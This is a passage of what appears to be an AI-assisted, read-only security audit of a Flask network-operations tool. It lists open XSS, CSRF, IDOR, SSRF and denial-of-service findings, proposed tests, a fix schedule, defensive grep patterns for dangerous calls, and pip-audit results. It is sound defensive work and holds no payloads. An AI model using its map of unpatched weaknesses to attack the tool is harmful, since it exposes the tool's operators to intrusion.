| H-02 (XSS find-leaf/NAT) | `xss_innerhtml_audit.md` rows #11, #13, #14 | Plan ONLY; **NEW**: links to backend writability |
| H-03 (CSRF) | `docs/refactor/spa_auth_ui.md` Phase 2 | Plan ONLY; **NEW**: identifies dev/test exposure independent of SPA auth refactor |
| H-04 (diff DoS by lines) | `tests/test_security_diff_dos.py` covers byte cap | **NEW**: per-line CPU vector not covered |
| H-05 (open writes in dev) | partially — `docs/refactor/audit_logger_coverage.md` adds audit lines | **NEW**: refusing to boot open in non-prod is a separate fix |
| H-06 (token-gate immutability) | `tests/test_security_token_gate_immutable.py` xfail + `docs/refactor/token_gate_immutability.md` | **EXISTING** |
| H-07 (legacy credstore) | `tests/test_security_legacy_credstore_deprecation.py` xfail + `docs/refactor/credential_store_migration.md` | **EXISTING** |
| M-01 (RIPEStat SSRF) | `tests/test_security_bgp_routes_pin_ripestat_host.py` (host pin) | partial; **NEW**: redirect/IP-resolution check missing |
| M-02 (run-result IDOR) | none | **NEW** |
| M-03 (report restore IDOR + side-effect via GET) | none | **NEW** |
| M-04 (transceiver legacy creds bypass) | `credential_store_migration.md` Phase 2.4 | partial; **NEW**: confirms two-store split is live |
| M-05 (report empty-id default coercion) | none | **NEW** |
| M-06 (notepad lock recursion fragility) | `notepad_repository.py:133` (Phase 13 fix is current) | **NEW** (RLock recommendation) |
| M-07 (audit logger) | `audit_logger_coverage.md` plan + 4 xfails in `tests/test_security_audit_log_coverage.py` | **EXISTING** |
| M-08 (inventory enumeration) | none | **NEW** |
| M-09 (find_leaf no cancel) | none | **NEW** |
| M-10 (TransceiverService not cached) | none | **NEW** |
| M-11 (ssh_runner str(e) leak) | none | **NEW** |
| M-12 (cred name validated only at runner layer) | none | **NEW** |
| L-01 .. L-09 | mix of existing tests + new | mostly **NEW** |

**Net new findings (not in any existing xfail or plan):** **5 HIGH, 9 MEDIUM, 8 LOW.**

---

## 5. Sweep results — `subprocess` / `eval` / `exec` / `pickle` / `os.system` / raw SQL / raw HTML

Already enumerated in §2. Net result:

- **`subprocess`**: 1 site, validated argv, no shell.
- **`eval` / `exec` / `pickle` / `marshal` / `os.system` / `os.popen` / `shell=True`**: **0 sites**.
- **Raw SQL**: 0 (all parameter-bound).
- **Server-side raw HTML**: 0 (no Jinja templates rendered).
- **Client-side raw HTML (`innerHTML =`)**: 135 sites; ~52 are unsafe per the existing classification audit; this report confirms 11 of them are reachable from open APIs today.

---

## 6. Recommended new test files

Write these under `tests/`:

1. `tests/test_security_xss_inventory_dropdowns.py` — covers H-01.
2. `tests/test_security_xss_findleaf_natlookup.py` — covers H-02 (Playwright-based, in `tests/e2e/specs/`).
3. `tests/test_security_csrf_unsafe_methods.py` — covers H-03 (assert every state-changing route rejects `text/plain` body and missing custom header).
4. `tests/test_security_diff_line_dos.py` — covers H-04 (line-count cap).
5. `tests/test_security_dev_boot_open_api.py` — covers H-05 (refusal to boot without explicit `PERGEN_DEV_OPEN_API=1`).
6. `tests/test_security_run_result_actor_scoping.py` — covers M-02.
7. `tests/test_security_report_restore_method.py` — covers M-03 (POST-only).
8. `tests/test_security_transceiver_uses_credential_service.py` — covers M-04.
9. `tests/test_security_report_repo_empty_id.py` — covers M-05.
10. `tests/test_security_notepad_lock_recursion.py` — covers M-06 (defensive RLock).
11. `tests/test_security_inventory_no_enumeration.py` — covers M-08.
12. `tests/test_security_findleaf_cancellation.py` — covers M-09.
13. `tests/test_security_ssh_runner_no_credential_leak.py` — covers M-11.
14. `tests/test_security_ripestat_no_internal_redirect.py` — covers M-01.

---

## 7. Suggested fix sequence

1. **Day 1 — Easy wins (LOW risk, HIGH value):**
   - H-04 (diff line cap) — 5-line change in `runs_bp.py`.
   - M-05 (report empty-id) — 2-line change in `report_repository.py`.
   - M-06 (notepad RLock) — 1-line change.
   - M-11 (ssh_runner err mapping) — 10-line change in `ssh_runner.py`.
   - L-02 (HSTS scheme guard) — 3-line change.

2. **Day 2-3 — XSS sweep (covers H-01 + H-02):**
   - Execute the existing `docs/refactor/xss_innerhtml_audit.md` Phase 4 plan; this single PR closes both findings and adds the lint guard from Phase 5.

3. **Day 4 — CSRF / dev-open posture (covers H-03 + H-05):**
   - Add `before_request` `Content-Type: application/json` requirement on all state-changing routes.
   - Add `PERGEN_DEV_OPEN_API=1` env requirement for the no-token boot path.
   - One PR; ~30 LOC.

4. **Day 5 — IDOR + actor scoping (covers M-02 + M-03 + M-08):**
   - Record `created_by_actor` on `RunStateStore.set` and `ReportRepository.save`.
   - 403 on actor mismatch; uniform 400 envelopes.

5. **Concurrent / longer-haul:**
   - H-06 (token-gate immutability) — follow `docs/refactor/token_gate_immutability.md`.
   - H-07 / M-04 (credential store migration) — follow `docs/refactor/credential_store_migration.md`.
   - audit logger coverage — follow `docs/refactor/audit_logger_coverage.md`.

---

## 8. What the parser refactor does NOT regress (validation)

Per the prompt's specific ask: the new `backend/parsers/` package is **read-only over already-parsed device output**, with no I/O, no dynamic imports, no `eval`, and no new HTTP / SQL surface. Verified by:

- `grep -rn "subprocess\|eval(\|exec(\|pickle\|requests\." backend/parsers/` → **0 matches**.
- `grep -rn "open(\|sqlite3\|os\.system" backend/parsers/` → **0 matches**.
- `Dispatcher._registry` is a static module-level dict (`backend/parsers/dispatcher.py:55-72`); no plugin loading.
- `ParserEngine.parse` is wrapped in `try/except` and returns `{}` on any parser exception (`backend/parsers/engine.py:126-130`) — failure mode is "empty dict", not crash.
- Common helpers (`backend/parsers/common/`) all use anchored regexes (no obvious ReDoS) and bounded JSON walks.

**Conclusion:** the refactor is clean. No new attack surface. Recommend a paired `tests/test_parsers_no_io.py` that uses `unittest.mock.patch("builtins.open", side_effect=AssertionError)` and runs every parser against a fixture; the parsers must NEVER hit disk.

---

## 9. Cross-cutting observations

- **No CORS configuration.** Flask defaults are correct (no `Access-Control-Allow-Origin` → same-origin only). Confirm no future commit accidentally adds `Flask-CORS` with `origins='*'`.
- **No rate limiting.** `Flask-Limiter` not installed. Combined with H-04 / M-09, a single attacker can pin all workers. Recommend `Flask-Limiter` with `default_limits=["100 per minute"]` on `/api/*`.
- **Audit channel is correctly isolated** (`app.audit` logger, separate from `app.request`) and `JsonFormatter` redacts sensitive keys (`backend/logging_config.py:36-46`). The redaction set is exhaustive (password, token, api_key, authorization, cookie, credential, …). **No leak observed in any blueprint's `_log.info` / `_log.exception` calls**, including credential `_actor()` lines.
- **Encryption is sound.** `EncryptionService` uses Fernet when available (preferred) and falls back to a hand-rolled AES-128-CBC + HMAC-SHA256 with PBKDF2 600k. The hand-rolled AES is a textbook FIPS-197 reference port; while implementing AES in pure Python is normally a smell, here the fallback is bounded by `cryptography` being a hard requirement (audit C-3) — **the AES backend is dead code in production**. Recommend deleting it once the reqs file's `cryptography>=41.0` pin is verified in CI on every supported Python version.
- **TLS verification disabled for device traffic only** (`backend/runners/_http.py:20`). RIPEStat / PeeringDB requests use `verify=True` (default). Posture is correct.
- **Path-traversal guards are in place** for the report files (`ReportRepository._safe_id` + `Path.is_relative_to`). The notepad path uses a fixed file name (`notepad.json`) with no user-controlled component. The inventory CSV path is operator-controlled via env var, not request-controlled — acceptable.

---

## 10. Dependency audit (`pip-audit`)

```
$ pip-audit -r requirements.txt -r requirements-dev.txt
No known vulnerabilities found

$ pip-audit                  # full venv
Found 3 known vulnerabilities in 1 package
Name Version ID                  Fix Versions
---- ------- ------------------- ------------
pip  25.2    CVE-2025-8869       25.3
pip  25.2    CVE-2026-1703       26.0
pip  25.2    ECHO-7db2-03aa-5591 25.2+echo.1
```

**Action:** upgrade `pip` in the dev venv to ≥ 26.0; declared runtime/dev requirements are clean.

---

## 11. Existing xfail security tests (for cross-reference)

| File | What it pins | Plan |
|---|---|---|
| `tests/test_security_health_disclosure.py` | `/api/v2/health` must not echo `CONFIG_NAME` | `docs/refactor/health_endpoint_disclosure_fix.md` |
| `tests/test_security_audit_log_coverage.py` (×4) | `inventory.add`, `notepad.save`, `run.pre`, `report.delete` audit lines | `docs/refactor/audit_logger_coverage.md` |
| `tests/test_security_router_devices_projection.py` | `/api/router-devices` must drop `credential` field | `docs/refactor/router_devices_projection.md` |
| `tests/test_security_token_gate_immutable.py` | env scrub after boot must not downgrade | `docs/refactor/token_gate_immutability.md` |
| `tests/test_security_legacy_credstore_deprecation.py` | `backend.credential_store` should be deprecated | `docs/refactor/credential_store_migration.md` |

These were **not** re-derived in this audit per the prompt; the count breakdown above excludes them from the "NEW" tally.

---

## 12. Reviewer notes

- This audit is **read-only**. No code modified.
- Severity classifications follow the OWASP risk model (likelihood × impact), tuned to a **self-hosted internal network-ops tool** threat model — i.e., the realistic attacker is a malicious operator on the same VLAN, not a public internet adversary.
- The 5 most exploitable findings (§0) are all **closeable in one engineering week** following the fix sequence in §7.
- The `parsers/` refactor is clean and introduces no regressions.

— end of audit —
